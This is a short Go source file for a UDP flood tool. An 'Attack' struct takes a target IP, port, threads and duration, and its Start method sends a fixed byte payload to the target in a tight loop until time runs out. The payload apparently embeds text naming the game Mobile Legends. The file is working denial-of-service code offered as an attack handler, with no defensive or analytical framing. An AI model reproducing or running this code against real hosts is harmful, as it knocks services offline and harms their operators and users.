package handlers

import (
	"fmt"
	"net"
	"sync"
	"time"
)

type Attack struct {
	IP       string
	Port     int
	Threads  int
	Duration time.Duration
}

func NewAttack(ip string, port, threads int, duration time.Duration) *Attack {
	return &Attack{
		IP:       ip,
		Port:     port,
		Threads:  threads,
		Duration: duration,
	}
}

func (a *Attack) Start(wg *sync.WaitGroup) {
	defer wg.Done()

	data := []byte{
		0x01, 0x71, 0xe9, 0xa8, 0x0e, 0xc2, 0x49, 0x8d,
		0x4d, 0x7c, 0x33, 0x0e, 0xf0, 0x08, 0x2e, 0x61,
		0x62, 0x6f, 0x6d, 0x20, 0x54, 0x53, 0x45, 0x62,
		0x20, 0x45, 0x48, 0x74, 0x2e, 0x53, 0x44, 0x4e,
		0x45, 0x47, 0x45, 0x6c, 0x20, 0x45, 0x4c, 0x49,
		0x42, 0x4f, 0x6d, 0x01,
	}

	addr := net.UDPAddr{
		IP:   net.ParseIP(a.IP),
		Port: a.Port,
	}

	conn, err := net.DialUDP("udp", nil, &addr)
	if err != nil {
		fmt.Println("Failed to create socket:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(a.Duration)
	for time.Now().Before(endTime) {
		for i := 0; i < 8; i++ {
			conn.Write(data)
		}
	}
}
